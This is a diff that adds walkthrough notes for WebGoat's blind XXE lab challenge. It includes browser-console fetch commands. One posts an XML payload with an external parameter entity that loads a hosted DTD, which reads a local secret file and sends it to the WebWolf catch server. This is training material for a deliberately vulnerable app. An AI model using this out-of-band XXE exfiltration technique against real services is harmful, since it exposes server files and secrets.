@@ -1,0 +1,69 @@
+====================================================================
+XXE BLIND CHALLENGE - LOCAL HTTP SERVER METHOD
+====================================================================
+
+✅ SETUP COMPLETE
+-----------------
+1. attack.dtd is hosted at: http://127.0.0.1:8003/attack.dtd
+2. Python HTTP server is running on port 8003
+3. WebWolf is ready to receive requests at port 8002
+
+TEST DTD ACCESSIBILITY
+----------------------
+Run this in browser console:
+
+fetch('http://127.0.0.1:8003/attack.dtd')
+  .then(r => r.text())
+  .then(console.log);
+
+STEP 1: SEND BLIND XXE ATTACK
+------------------------------
+Copy and run in browser console:
+
+fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/xml'},
+  body: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://127.0.0.1:8003/attack.dtd">
+  %remote;
+]>
+<comment><text>Blind XXE Attack</text></comment>`
+}).then(r => r.text()).then(console.log);
+
+STEP 2: CHECK WEBWOLF FOR SECRET
+---------------------------------
+1. Open WebWolf: http://127.0.0.1:8002/WebWolf
+2. Click "Incoming requests" in left menu
+3. Look for a request with the secret in the URL
+4. The URL will look like: /WebWolf/landing?secret=<SECRET_VALUE>
+
+STEP 3: SUBMIT SECRET TO WEBGOAT
+---------------------------------
+Once you have the secret, run:
+
+fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    comment: "YOUR_SECRET_HERE"
+  })
+}).then(r => r.text()).then(console.log);
+
+WHAT HAPPENS BEHIND THE SCENES:
+--------------------------------
+1. XXE payload loads attack.dtd from your local server (port 8003)
+2. DTD reads C:\Users\mahad\.webgoat-2025.3\XXE\nooniman\secret.txt
+3. DTD sends secret to WebWolf (port 8002) via HTTP request
+4. You retrieve secret from WebWolf "Incoming requests"
+5. Submit secret back to WebGoat to complete challenge
+
+TROUBLESHOOTING:
+----------------
+- If DTD not accessible: Check Python server is running
+- If no request in WebWolf: Check DTD content and file path
+- If 500 error: Verify XML payload formatting
+
+To stop the Python server: Press Ctrl+C in the terminal
